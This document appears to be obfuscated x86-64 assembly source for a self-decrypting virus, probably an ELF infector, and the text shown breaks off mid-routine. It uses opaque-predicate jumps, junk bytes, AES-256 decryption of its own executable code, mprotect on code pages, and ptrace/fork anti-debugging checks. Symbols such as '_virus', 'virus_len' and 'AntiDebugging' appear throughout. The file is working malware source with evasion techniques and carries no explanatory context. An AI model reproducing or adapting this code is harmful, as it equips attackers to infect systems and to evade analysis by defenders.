db 0x8f
    jmp         ..@SYVQUFkssiPa
..@Pwu2YH4MTMMy:
    xor         rcx, rcx
    jl          ..@cDXcrS4n0Zwg
    jge         ..@cDXcrS4n0Zwg
..@slQkn49Ef0l4:
    test        eax, eax
    jmp         $+3
db 0xce
    jmp         $+4
db 0xda, 0x22
    js          ..@7NCxvCOxpRKt
    jns         ..@7NCxvCOxpRKt
..@B6dHOCtuFj66:
    xor         r2, r2
    xchg        rcx, rcx
    GGLOBAL     _decrypt
    js          ..@ymqsAbZQihG0
    jns         ..@ymqsAbZQihG0
..@07KEfpEYcmmF:
    mov         r1, rax
    xor         r2, r2
    xor         r3, r3
    js          ..@SQUtOOMMUeb7
    jns         ..@SQUtOOMMUeb7
..@z3FvXSORwe1O:
    sub         r1, QWORD [r5]
    DESTROY_MX_VAR
    mov         rax, r1
    jmp         $+5
db 0xa3, 0x18, 0xa8
    jmp         ..@tXySLzPaNAgd
..@TAVvhlEG2MLx:
    call        ..@nn6nAPlSw18r
    jmp         $+3
db 0x43
    jl          ..@KXIgwdQ4ddil
    jge         ..@KXIgwdQ4ddil
..@9nV47NSKZkIT:
    movdqa      OWORD [rsi+0xc0], xmm1
    jmp         $+3
db 0x29
    jb          ..@ME4Es11sYgp8
    jae         ..@ME4Es11sYgp8
..@S1RZVHDY54An:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_FORK
    syscall
%endif
%endif
    jb          ..@v7KC2GinILfD
    jae         ..@v7KC2GinILfD
..@F6WF8aARwfr4:
    push        rsi
    pop         rsi
    jmp         $+5
db 0x46, 0x09, 0xd9
    js          ..@utJPNZBWVhiT
    jns         ..@utJPNZBWVhiT
..@7YX7anEgMgJm:
    pop         rdx
    js          AntiDebugging
    jns         AntiDebugging
..@SD4ZNuP3dk93:
    cmp         QWORD [r5], 0x0000000000000000
    jb          ..@ZRcxd5roqmZe
    jae         ..@ZRcxd5roqmZe
..@vwooUftdjWg0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    call        ExitProgram
%endif
%endif
    jmp         ..@UmIUWPzV7oF8
..@9wzX5nkw17BJ:
    pop         rdi
    jl          ..@WVDM8GBDrS5A
    add         rsp, _AESD_OFF_size+0x100
    jl          ..@FKK6kQIcLQ17
    jge         ..@FKK6kQIcLQ17
..@KnfLuqdABxEv:
    ret
    jmp         DecryptExecutableCode
..@tXySLzPaNAgd:
    xchg        rax, rax
    jmp         $+3
db 0xce
    jmp         $+5
db 0x7f, 0x4d, 0x8f
    jb          ..@aw91mK9jNOes
    jae         ..@aw91mK9jNOes
..@MaLeETN5ov45:
    ret
    jb          Strncmp
    jae         Strncmp
..@v7KC2GinILfD:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    cmp         eax, 0x0
%endif
%endif
    jmp         $+4
db 0xeb, 0x47
    js          ..@gKRSLsxnrOKM
    jns         ..@gKRSLsxnrOKM
..@OYs0fd81OapY:
    movdqu      OWORD [rsp+0x10],xmm0
    movdqu      xmm1, OWORD [rsp+0x20]
    jmp         $+4
db 0x83, 0xb3
    jmp         $+5
db 0xd5, 0xa4, 0x30
    jmp         $+3
db 0x25
    jb          ..@PaKOreBc2mJz
    jae         ..@PaKOreBc2mJz
..@thSGeWrRMjnD:
    movdqa      OWORD [rsi+0xa0], xmm1
    jmp         ..@TvSS9zvohjfA
..@gknrTHxQEBog:
    call        ..@nn6nAPlSw18r
    mov         rbx, rbx
    jmp         ..@thSGeWrRMjnD
..@k4kR42BsGaVz:
    mov         rsi, rsi
    jl          ..@vnYDfUYPz0bA
    jge         ..@vnYDfUYPz0bA
..@o7K6wmcQiiLN:
    mov         r2, QWORD [r4]
    test        r2, r2
    jl          ..@MN5MifF1OecQ
    jge         ..@MN5MifF1OecQ
..@uIdSmgkE6UO8:
    cmp         BYTE [r2], al
    je          ..@QIYuUEiNULnG
    sub         al, BYTE [r2]
    jmp         ..@bkbTxUhh2FJj
..@FTUnVPvuxuUs:
    add         rdi, bytes
    jmp         $+3
db 0x94
    jmp         $+4
db 0x51, 0x01
    jmp         $+4
db 0x4b, 0x52
    jmp         ..@ImuwW2GatDDR
..@anrap3mvxd3R:
    xor         r2, r2
    xor         r3, r3
    GGLOBAL     _decrypt
    jmp         ..@qVQKjUGVwPq0
..@jzGljwfxM8eP:
    sub         rsp, _UEC_OFF_size
    jl          ..@WIn8TZNCYdvF
    jge         ..@WIn8TZNCYdvF
..@RF1lDnjbsVbm:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rax, rax
%endif
%endif
    jmp         $+4
db 0x89, 0xb4
    jmp         ..@nXgt5bxZrhgk
..@r6Ngn1QzvXr4:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_PTRACE
    syscall
%endif
%endif
    jl          ..@B5f2Jz6I0m9X
    jge         ..@B5f2Jz6I0m9X
..@UsuE0xReDwso:
    movdqa      OWORD [rsi+0x50], xmm3
    aeskeygenassist xmm2, xmm3, 0x4
    call        ..@nn6nAPlSw18r
    jmp         $+3
db 0xdc
    jmp         $+3
db 0x60
    je          ..@R8NFcb1fSOEq
    jne         ..@R8NFcb1fSOEq
..@mUSDB3SbojfP:
    test        eax, eax
    jmp         $+5
db 0xd9, 0x33, 0x87
    jmp         ..@k4kR42BsGaVz
..@o1JldI7Wo5w9:
    xor         r1, r1
    jmp         ..@4JjRRN41KC34
..@RxjzEYPxJpnm:
    pop         rax
    xchg        rbx, rbx
    jmp         $+3
db 0x24
    jb          ..@c88YFizkxady
    jae         ..@c88YFizkxady
..@WVbPRXwgOIGP:
    jmp         ..@IoLscLiPrmuP
    jb          ..@R6x3JpRskwZ3
    jae         ..@R6x3JpRskwZ3
..@UGm7uZFPfIXK:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r3, r3
    xor         r4, r4
%endif
%endif
    jmp         $+4
db 0x1e, 0x93
    jmp         ..@RF1lDnjbsVbm
..@t0MxslBHqd5o:
    aesimc      xmm0,xmm1
    jmp         $+3
db 0x02
    jmp         ..@4bJuKzcKaFGZ
..@oEaIuc3M3gZQ:
    mov         rdi, QWORD [rsp+3*bytes]
    jb          ..@qp4v77RwyunE
    jae         ..@qp4v77RwyunE
..@Et9u9eEbtFM6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rbx
%endif
%endif
    jb          ..@13frWGdJlIBo
    jae         ..@13frWGdJlIBo
..@OF6IWSFKAkT8:
    movdqa      OWORD [rsi+0x80], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@2UskHexg6DH2
    js          ..@xxENSkvnPx4a
    jns         ..@xxENSkvnPx4a
..@xJ0ZI9i606sP:
    push        rdi
    pop         rdi
    jmp         ..@blnNbQeuAQPk
..@wPk7KvFdAncY:
%ifndef ENABLE_DEBUGGING
    RFILE       rax, [rsp], 0x200
    cmp         eax, 0x200
%endif
    jl          ..@XDVAWKcNoytA
    jge         ..@XDVAWKcNoytA
..@xUaXUudVioj8:
%ifndef ENABLE_DEBUGGING
    mov         r1, r5
%endif
    jmp         ..@l0ulnvQfcsoh
..@xnWCpg37QBqE:
    movdqu      xmm1, OWORD [rsp+0x10]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp]
    jmp         $+5
db 0x19, 0x4f, 0xdb
    jl          ..@rENHKAB2qQ6E
    jge         ..@rENHKAB2qQ6E
..@bxuqFBkZpCcn:
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@2UskHexg6DH2
    mov         rcx, rcx
    js          ..@JvsOSXGJbK33
    jns         ..@JvsOSXGJbK33
..@fVtjZ1UT8of8:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
    jz          ..@pYnjsSjEEBrA
%endif
%endif
    js          ..@2LvLgYWLtxnC
    jns         ..@2LvLgYWLtxnC
..@ArEkOeQRfT8l:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0xf9, 0xb5
    jmp         $+3
db 0x0c
    jmp         $+4
db 0xe3, 0x96
    js          ..@7dVTGqExoGZi
    jns         ..@7dVTGqExoGZi
..@VH6rwPb8L0so:
    xor          r2, r2
    xor          r3, r3
    je          ..@75DyucRSeT1T
    jne         ..@75DyucRSeT1T
..@b74M7YaNe7an:
    mov         rdi, rdi
    push        rdi
    jmp         $+3
db 0xfb
    jmp         ..@flCaQ4eIvyiJ
..@upUlvGIc9ohc:
    aesimc      xmm0,xmm1
    jmp         $+5
db 0xb0, 0x43, 0x0f
    jmp         $+3
db 0x57
    jmp         ..@7LU0Egjo41NE
..@FKK6kQIcLQ17:
    leave
    jmp         $+3
db 0x9b
    jl          ..@hxpkQibYfY5k
    jge         ..@hxpkQibYfY5k
Aes256KeyCreation:
    jmp         ..@v9nEXPg9Pmm8
..@RRC1NkfUY8Zd:
    mov         rdx, rdx
    jmp         $+5
db 0x34, 0x2c, 0xcb
    jmp         $+4
db 0xda, 0x90
    js          ..@V1x2jGV5SXHK
    jns         ..@V1x2jGV5SXHK
..@dkJK5gxBcywJ:
    xor         r2, r2
    jmp         ..@p7cP8IQj0i36
..@jbYHD9Lk1jRj:
    jl          ..@ZBhJSFGs9vFj
    rep         cmpsb
    jz          ..@iqiXI8xrJe8j
    jmp         $+4
db 0x46, 0xfd
    jmp         $+5
db 0x0c, 0x5f, 0x69
    jl          ..@fAtFEU2BwwsL
    jge         ..@fAtFEU2BwwsL
..@SPmC29OVrCsE:
    mov         al, BYTE [r1]
    jmp         ..@uIdSmgkE6UO8
..@ns4aiXuXSiUA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
    mov         rax, SYS_WAIT4
    syscall
%endif
%endif
    jmp         $+3
db 0x82
    jmp         $+5
db 0xa4, 0x1a, 0x86
    jb          ..@AYwuX1K2a3R6
    jae         ..@AYwuX1K2a3R6
GetEnv:
    jmp         ..@gOCX4Z7dW0xS
..@gLKM6H0HObXm:
    mov         r2d, DWORD [r5]
    sub         r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    jmp         $+5
db 0x7f, 0x7e, 0x39
    js          ..@mQf17j56Vvyd
    jns         ..@mQf17j56Vvyd
..@fAtFEU2BwwsL:
    mov         rdx, QWORD [rsp]
    js          ..@qNkAaAmJjIYx
    jns         ..@qNkAaAmJjIYx
..@nc3LL0bBk1wV:
    mov         rcx, rcx
    jmp         $+5
db 0x95, 0x76, 0xd7
    je          ..@35ki5TkAox5k
    jne         ..@35ki5TkAox5k
..@k2U9MsbsGIJw:
    aeskeygenassist xmm2, xmm3, 0x1
    jmp         $+4
db 0x3d, 0xf3
    jb          ..@KeU5x6J57Zhs
    jae         ..@KeU5x6J57Zhs
..@gKRSLsxnrOKM:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jl          ..@B5f2Jz6I0m9X
%endif
%endif
    jmp         $+3
db 0x00
    jb          ..@fVtjZ1UT8of8
    jae         ..@fVtjZ1UT8of8
..@mQf17j56Vvyd:
    lea         r3, [rsp+_UEC_OFF.key]
    jmp         $+3
db 0xb2
    jmp         ..@XV4DDIBrdUDk
..@V1x2jGV5SXHK:
    call        ..@2UskHexg6DH2
    jmp         $+3
db 0xca
    jmp         ..@ZHA7xxDNOPMk
..@LtQySUgmHL5C:
    push        rbx
    pop         rbx
    jmp         $+4
db 0x0b, 0xb9
    js          ..@AiKLdWE02kgw
    jns         ..@AiKLdWE02kgw
..@R8NFcb1fSOEq:
    movdqa      OWORD [rsi+0x60], xmm1
    jmp         $+3
db 0x16
    jl          ..@AXu45WLXOGmM
    jge         ..@AXu45WLXOGmM
..@IFZ6IWFLnykF:
    xor         r4, r4
    xor         r5, r5
    mov         rbp, rbp
    jmp         $+4
db 0xb8, 0xd7
    jmp         ..@MnGezJgTTUJ2
..@WIn8TZNCYdvF:
    push        rax
    jb          ..@6wq8UFTyVG6y
    jae         ..@6wq8UFTyVG6y
..@AHomcNdwUCTd:
    pxor        xmm1, xmm4
    jmp         $+5
db 0xe2, 0xbc, 0xeb
    jl          ..@LnZFDHJ2knoD
    jge         ..@LnZFDHJ2knoD
..@70IcnKPFtQaX:
    mov         rdi, rdi
    jmp         ..@k2U9MsbsGIJw
..@jmSpTpNOw8cT:
    xchg        rcx, rcx
    rep         nop
    jl          ..@VGav1N1xqDwG
    jge         ..@VGav1N1xqDwG
..@BKHQORPqrshD:
    xchg        rsi, rsi
    jmp         $+5
db 0x28, 0x3f, 0x26
    jl          ..@G1aig9q8wWCV
    jge         ..@G1aig9q8wWCV
..@bkbTxUhh2FJj:
    jmp         ..@OdyWjsaLm0lA
    jmp         $+4
db 0xca, 0x20
    jb          ..@QIYuUEiNULnG
    jae         ..@QIYuUEiNULnG
..@ZRfMln4pRzuQ:
    rep         nop
    jmp         $+5
db 0x56, 0x9d, 0x5e
    jmp         ..@0XrY7jMt4wRy
..@4ev703fRaZuq:
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xc0]
    jl          ..@oKaYweOpuSZa
    jge         ..@oKaYweOpuSZa
..@uhh2mvLUZEqG:
    rep         movsd
    lea         r1, [rsp+_UEC_OFF.key]
    jmp         $+5
db 0xab, 0xd3, 0x2c
    js          ..@1lhhwP718KZb
    jns         ..@1lhhwP718KZb
..@IgEIvXzLnYGI:
    push        rdx
    jmp         $+5
db 0x54, 0xd0, 0xc3
    jmp         $+4
db 0xfd, 0xdb
    jmp         $+5
db 0xb1, 0x39, 0x6b
    jmp         ..@kwdCHQRHvuLu
..@VruHmxKUjfNC:
    push        r3
    push        rcx
    jb          ..@SkqNMbiOs8bO
    jae         ..@SkqNMbiOs8bO
..@i9HXMtIfm83C:
    aeskeygenassist xmm2, xmm1, 0x0
    je          ..@fHVEbWHboUEo
    jne         ..@fHVEbWHboUEo
DecryptExecutableCode:
    jmp         ..@LtQySUgmHL5C
..@8nDYCPPKuJOz:
    movdqa      OWORD [rsi+0x70], xmm3
    js          ..@niV9yFW7SWWX
    jns         ..@niV9yFW7SWWX
..@1lhhwP718KZb:
    VAR         public, _virus
    jmp         $+5
db 0xcc, 0x06, 0xed
    js          ..@W4sBrFilwNlg
    jns         ..@W4sBrFilwNlg
..@QABfKuyy1T53:
    add         r2, 1
    jmp         $+4
db 0x56, 0xf1
    js          ..@7IYSweGr6r0D
    jns         ..@7IYSweGr6r0D
..@SWbOTUhJpRRP:
    push        rdx
    pop         rdx
    jmp         ..@ZBhJSFGs9vFj
..@3RjzJVDxZcd4:
    mov         rsi, QWORD [rsp+1*bytes]
    js          ..@YtOhiyi9Z4dp
    jns         ..@YtOhiyi9Z4dp
..@8EXmJ9Gl3EIL:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
    mov         rax, SYS_WAIT4
%endif
%endif
    jmp         $+3
db 0xde
    jmp         $+5
db 0xf9, 0xfc, 0x62
    jb          ..@hjK9VoKwhW9c
    jae         ..@hjK9VoKwhW9c
..@oJRKAFu2FClK:
    add         r2, r4
    sub         r2, non_encrypted_len
    mov         r5, r2
    jl          ..@e8V82gDXLg6o
    jge         ..@e8V82gDXLg6o
..@WVDM8GBDrS5A:
    movdqu      xmm0, [rsi+rcx]
    jmp         $+3
db 0x6e
    jb          ..@RXwUGGQmke6s
    jae         ..@RXwUGGQmke6s
..@SYVQUFkssiPa:
    mov         rsi, rsi
    pop         r1
    jmp         $+3
db 0x15
    js          ..@ZzvJxeUZ5oko
    jns         ..@ZzvJxeUZ5oko
..@euPRQdhAZKMp:
    pop         rdx
    xchg        rsp, rsp
    jmp         ..@in4dfQVRywkM
..@vMAnZLEv23I6:
    mov         rax, SYS_EXIT
    jmp         ..@6bSdPZedaYlT
..@Fd82tfkq6sRE:
    movdqu      xmm1, OWORD [rsp+0xb0]
    aesimc      xmm0,xmm1
    js          ..@P7Tn0RYVsjfi
    jns         ..@P7Tn0RYVsjfi
..@qNkAaAmJjIYx:
    sub         rdx, rcx
    jmp         $+5
db 0x53, 0xa4, 0x19
    jmp         ..@QuhPb68HEzUQ
..@mEPgwQ5PgBHc:
    xor          r4, r4
    jmp         ..@ZsisragwfrsX
..@MnGezJgTTUJ2:
    jmp         rax
    jl          ..@t4PI6VLOitT0
    jge         ..@t4PI6VLOitT0
..@or3wA2z9EvAI:
    call        ExitProgram
    jmp         $+3
db 0x08
    jb          ..@pPsWpyBclGtK
    jae         ..@pPsWpyBclGtK
..@ZRcxd5roqmZe:
    je          ..@35ki5TkAox5k
    jmp         ..@6O1Qa9E0LJag
..@ymqsAbZQihG0:
    mov         r1, r5
    GGLOBAL     virus_len
    jmp         $+3
db 0x89
    jl          ..@gLKM6H0HObXm
    jge         ..@gLKM6H0HObXm
..@e6QgXwGJBra3:
    mov         rbx, rdi
    jmp         ..@3RjzJVDxZcd4
..@B2H0zMi6qL0h:
    xor         rax, rax
    jmp         $+3
db 0xef
    jl          ..@IoLscLiPrmuP
    jge         ..@IoLscLiPrmuP
..@6bSdPZedaYlT:
    syscall
    jmp         ..@wke2ekeX4mKd
..@KeU5x6J57Zhs:
    call        ..@nn6nAPlSw18r
    movdqa      OWORD [rsi+0x20], xmm1
    push        rax
    jmp         $+4
db 0xce, 0xc7
    jmp         $+4
db 0x53, 0x06
    je          ..@t45mUfHCfjL2
    jne         ..@t45mUfHCfjL2
..@yCciRXDGuKh2:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jmp         $+3
db 0xbb
    js          ..@OoSdwq0aCqSp
    jns         ..@OoSdwq0aCqSp
..@vnYDfUYPz0bA:
    xchg        rdi, rdi
    js          ..@43jskOFVRywT
    jns         ..@43jskOFVRywT
..@8Yl58P131umr:
    mov         rdx, rdx
    push        rdx
    pop         rdx
    jmp         $+3
db 0x84
    js          ..@2dKq3trCRcFX
    jns         ..@2dKq3trCRcFX
..@sF3ki7u7pM7i:
    pxor        xmm0, xmm1
    je          ..@4ev703fRaZuq
    jne         ..@4ev703fRaZuq
..@p7cP8IQj0i36:
    mov         rax, r2
    je          ..@AdnNSEmHLOeR
    jne         ..@AdnNSEmHLOeR
..@SkqNMbiOs8bO:
    pop         rcx
    jmp         ..@BJEoLidoXV5I
..@SY5VzlOLUAAg:
    pxor        xmm3, xmm4
    jmp         ..@R5CJ2dXEnB9Y
..@ewNaocM0q3Mm:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@B5f2Jz6I0m9X
    push        rdx
    pop         rdx
%endif
%endif
    js          ..@lVZWIZ4Hg5eV
    jns         ..@lVZWIZ4Hg5eV
..@4HU9hKiebiBt:
    mov         rdi, rbp
    jl          ..@ruxryoGXZ1v8
    jge         ..@ruxryoGXZ1v8
..@5jEZVEXHhpOX:
    pop         rbx
    pop         rdi
    jl          ..@uhh2mvLUZEqG
    jge         ..@uhh2mvLUZEqG
..@ZvUhKRP04VYT:
    add         rax, 1
    jb          ..@WVbPRXwgOIGP
    jae         ..@WVbPRXwgOIGP
..@juW5VLdstvEk:
    xchg        rdx, rdx
    movdqu      xmm1, OWORD [rsp+0x30]
    jmp         $+4
db 0xbe, 0x5e
    jmp         ..@ZPKbAbYSIYZh
..@7LU0Egjo41NE:
    movdqu      OWORD [rsp+0x40],xmm0
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         $+4
db 0x7e, 0x36
    jmp         $+5
db 0x76, 0x7e, 0x1d
    jb          ..@duevSDcK244v
    jae         ..@duevSDcK244v
..@eMqrfRh0QYC3:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
%endif
    jmp         $+3
db 0xce
    jmp         ..@yCciRXDGuKh2
ExitProgram:
    jmp         ..@D0w8vO1B8t7c
..@7EVoj9oBu4dO:
    push        rdx
    pop         rdx
    jb          ..@RdtWP6eAqazT
    jae         ..@RdtWP6eAqazT
..@TvSS9zvohjfA:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0xdb, 0xc8
    js          ..@yabAmNpd4Fui
    jns         ..@yabAmNpd4Fui
..@qp4v77RwyunE:
    mov         rsi, rsi
    jmp         $+4
db 0x23, 0xf9
    jmp         ..@e6QgXwGJBra3
..@nzaP0uYATidG:
    syscall
    jmp         ..@QkH5b3PLg0Km
..@orOoRWtOorcJ:
    pop         rdi
    jmp         $+4
db 0xaf, 0xa0
    je          ..@JmnWaeuj7Rsa
    jne         ..@JmnWaeuj7Rsa
..@qVQKjUGVwPq0:
    mov         rsi, rsi
    jmp         $+4
db 0x24, 0xa2
    jmp         $+5
db 0xd0, 0x64, 0x63
    jmp         $+5
db 0x50, 0xff, 0xe6
    jb          ..@QOb075Ffr4Fe
    jae         ..@QOb075Ffr4Fe
..@F9nggxhe7HMZ:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rdx
%endif
%endif
    jmp         ..@pYnjsSjEEBrA
..@R5CJ2dXEnB9Y:
    pxor        xmm3, xmm2
    jmp         $+5
db 0x99, 0x43, 0x9f
    jmp         $+4
db 0xe5, 0xf3
    jmp         $+5
db 0x74, 0x6c, 0xc6
    jmp         $+3
db 0xf2
    jmp         ..@t2ViZkk1IpWF
..@djD7sDORwsGo:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    test        rax, rax
%endif
%endif
    jmp         ..@CEhMxkApln0X
..@SJx6kzXXBuB8:
%ifndef ENABLE_DEBUGGING
    VAR         public, procself
    OFILE       [r5], 0x0
    cmp         eax, 0x3
%endif
    jmp         $+5
db 0xe8, 0x1f, 0x10
    jmp         ..@LEX1QmbzdJpS
..@Wy8vhd2j2Nas:
    mov         r1, QWORD [rsp]
    jmp         ..@o7K6wmcQiiLN
..@3cjWbirNZ0M6:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
    push        rcx
%endif
    jb          ..@thS973a8gHeF
    jae         ..@thS973a8gHeF
..@Tb3NeKSzRMPU:
    movdqu      xmm1, [rdi]
    js          ..@XOiRg2NZlLeE
    jns         ..@XOiRg2NZlLeE
..@G1aig9q8wWCV:
    VAR         public, _start
    jmp         $+5
db 0x7f, 0x60, 0x2b
    jmp         $+3
db 0x89
    jmp         $+5
db 0x59, 0xb2, 0x63
    js          ..@uWGaRGYcZp0x
    jns         ..@uWGaRGYcZp0x
..@XblOWWaJEXvK:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r2, rsp
    xor         r3, r3
%endif
%endif
    jmp         $+4
db 0xe8, 0x64
    jmp         $+5
db 0x8a, 0xf0, 0x11
    jb          ..@ns4aiXuXSiUA
    jae         ..@ns4aiXuXSiUA
..@2RKtsyAWKK1M:
    mov         r3, rax
    je          ..@t6yO7vqkKpSV
    jne         ..@t6yO7vqkKpSV
..@JmnWaeuj7Rsa:
    sub         rdi, 1
    sub         rdi, 0x5
    jmp         $+5
db 0x01, 0x56, 0xcb
    jb          ..@xJ0ZI9i606sP
    jae         ..@xJ0ZI9i606sP
..@yxwie5A3GSuO:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x60]
    aesdec      xmm0, xmm1
    je          ..@d9XLGF84JowH
    jne         ..@d9XLGF84JowH
..@rv8PmJyj4Ttr:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    push        rdi
    jmp         ..@9wzX5nkw17BJ
..@niV9yFW7SWWX:
    aeskeygenassist xmm2, xmm3, 0x8
    call        ..@nn6nAPlSw18r
    je          ..@Lh4IDqqJb1sn
    jne         ..@Lh4IDqqJb1sn
..@AYwuX1K2a3R6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rax
%endif
%endif
    jmp         ..@ZzNnVG5I9Aqp
..@JSNDlRaw9Tpd:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
    jnz         ..@t4PI6VLOitT0
%endif
    jmp         $+3
db 0xdd
    js          ..@3qtdjrxXGxxW
    jns         ..@3qtdjrxXGxxW
Aes256Decryption:
    jmp         ..@VG5IPEqJELzo
..@ZPKbAbYSIYZh:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x30],xmm0
    movdqu      xmm1, OWORD [rsp+0x40]
    jmp         $+5
db 0xf2, 0x7b, 0x61
    jmp         ..@upUlvGIc9ohc
..@7za2cbSR6slo:
    and         r1, ~(PAGE_SIZE-1)
    jmp         $+3
db 0xff
    je          ..@K1JHO9HpVqnc
    jne         ..@K1JHO9HpVqnc
..@QIYuUEiNULnG:
    add         r1, 1
    jmp         $+3
db 0x80
    jmp         $+4
db 0x28, 0xbb
    jb          ..@IgEIvXzLnYGI
    jae         ..@IgEIvXzLnYGI
..@mVH9r7KC85GL:
    pop         rcx
    jmp         $+3
db 0xd4
    jb          ..@jetOhpvSfCkS
    jae         ..@jetOhpvSfCkS
..@6wq8UFTyVG6y:
    pop         rax
    mov         rax, rax
    xor         rax, rax
    jmp         $+4
db 0x7c, 0xd2
    jmp         ..@oS8K53abalUG
..@thS973a8gHeF:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    jl          ..@xUaXUudVioj8
    jge         ..@xUaXUudVioj8
..@W4sBrFilwNlg:
    mov         r2, r5
    mov         r3, keycreation_len
    jl          ..@I6AqKy6Kilze
    jge         ..@I6AqKy6Kilze
..@HcwaPhK2oSY3:
    movdqu      xmm3, OWORD [r2+rax+0x10]
    pxor        xmm0, xmm2
    pxor        xmm1, xmm3
    jmp         ..@8Yl58P131umr
..@Vrn0XVU6aWSi:
    movdqu      xmm1, OWORD [rsp+0x80]
    mov         rbp, rbp
    jmp         $+3
db 0x01
    jmp         $+5
db 0x6e, 0xaa, 0x4a
    jl          ..@513h6dUlMfLn
    jge         ..@513h6dUlMfLn
..@qP0QHp799uhn:
%ifndef ENABLE_DEBUGGING
    VAR         public, lines
    mov         r1, r5
    call        GetEnv
%endif
    jl          ..@JSNDlRaw9Tpd
    jge         ..@JSNDlRaw9Tpd
..@AyYC0tObn2WE:
    movdqu      xmm1, OWORD [rsp+0x60]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x60],xmm0
    jl          ..@F6WF8aARwfr4
    jge         ..@F6WF8aARwfr4
..@z73OrPHU6TZw:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rsi
%endif
%endif
    jmp         $+3
db 0x2f
    jb          ..@ewNaocM0q3Mm
    jae         ..@ewNaocM0q3Mm
..@M2WHk6gmIQbQ:
%ifndef ENABLE_DEBUGGING
    cmp         WORD [rax], 0x0a30
    jne         ..@t4PI6VLOitT0
    add         rsp, 0x1000
%endif
    jmp         $+5
db 0x27, 0x4c, 0xd7
    jmp         $+4
db 0x84, 0xe3
    js          ..@3cjWbirNZ0M6
    jns         ..@3cjWbirNZ0M6
..@N1rCdS0YjHxV:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0x1
    mov         rax, SYS_WRITE
%endif
    jmp         ..@qM8RA48RHAON
..@if8ZP0xAvyxZ:
    push        rbx
    jmp         $+5
db 0x58, 0x07, 0xff
    js          ..@HrMa29rYcDuQ
    jns         ..@HrMa29rYcDuQ
..@CuxhrpvnFfvX:
%ifndef ENABLE_DEBUGGING
    CFILE       r5d
    mov         r1, rsp
%endif
    jmp         $+5
db 0x10, 0xec, 0xcd
    jmp         $+4
db 0xc5, 0xd2
    jmp         $+5
db 0xe1, 0xa6, 0x3d
    js          ..@ZA8hvkFRvkbP
    jns         ..@ZA8hvkFRvkbP
..@ll75SuIvokLv:
    call        ..@2UskHexg6DH2
    js          ..@hGjOxMXtx64h
    jns         ..@hGjOxMXtx64h
..@k0nlRsmY8Ky4:
    mov         rax, SYS_MPROTECT
    js          ..@zEw34wHbiQ8f
    jns         ..@zEw34wHbiQ8f
..@XVNMoM368Pwk:
    jz          ..@R6x3JpRskwZ3
    jmp         $+4
db 0x5e, 0x9e
    jmp         $+3
db 0x40
    jmp         $+4
db 0x9e, 0x1c
    jmp         ..@if8ZP0xAvyxZ
..@CCI0wdwbsfzn:
    aeskeygenassist xmm2, xmm3, 0x20
    jb          ..@2Whxcle5awag
    jae         ..@2Whxcle5awag
..@D0w8vO1B8t7c:
    DESTROY_MX_VAR
    jl          ..@vMAnZLEv23I6
    jge         ..@vMAnZLEv23I6
..@JKpvX5RO5lMy:
    movdqu      OWORD [rsp+0xd0],xmm0
    jmp         ..@WVDM8GBDrS5A
..@7NCxvCOxpRKt:
    jz          ..@35ki5TkAox5k
    xor         rdi, rdi
    call        ExitProgram
    jmp         ..@nc3LL0bBk1wV
..@AiKLdWE02kgw:
    mov         rbp, rbp
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    jmp         $+4
db 0x0d, 0x4a
    jmp         ..@ESUi4obNizJ8
..@RBIrACHBi6jn:
    movdqu      xmm1, OWORD [rsp+0x90]
    aesdec      xmm0, xmm1
    jl          ..@q4gs07qZueyA
    jge         ..@q4gs07qZueyA
..@zIFf1afbVXRk:
    movdqa      OWORD [rsi+0x40], xmm1
    xchg        rdi, rdi
    jmp         $+3
db 0x38
    js          ..@i9HXMtIfm83C
    jns         ..@i9HXMtIfm83C
Aes256KeyExpansion:
    jmp         ..@Tb3NeKSzRMPU
..@u3fCoB9VPkMt:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_PTRACE
%endif
%endif
    jmp         ..@djD7sDORwsGo
..@JMXSAE4HXWFm:
    movdqu      OWORD [rsp+0x50],xmm0
    jl          ..@AyYC0tObn2WE
    jge         ..@AyYC0tObn2WE
..@MnSp9olmzIMo:
    movdqu      xmm1, OWORD [rsp+0x10]
    aesimc      xmm0,xmm1
